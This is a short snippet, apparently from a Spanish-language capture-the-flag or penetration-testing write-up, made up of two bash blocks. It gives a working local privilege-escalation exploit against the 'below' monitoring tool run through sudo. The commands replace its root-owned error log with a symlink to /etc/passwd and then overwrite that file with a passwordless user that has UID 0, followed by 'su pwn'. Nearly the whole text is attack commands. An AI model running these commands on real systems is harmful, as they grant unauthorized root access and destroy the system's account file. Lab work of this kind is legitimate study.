```bash
#below tiene el link y podemos alterar un archivo de root.
echo 'pwn::0:0:pwn:/root:/bin/bash' > /tmp/fakepass && rm -f /var/log/below/error_root.log && ln -s /etc/passwd /var/log/below/error_root.log && sudo /usr/bin/below 
```

```bash
cp /tmp/fakepass /var/log/below/error_root.log && su pwn
```
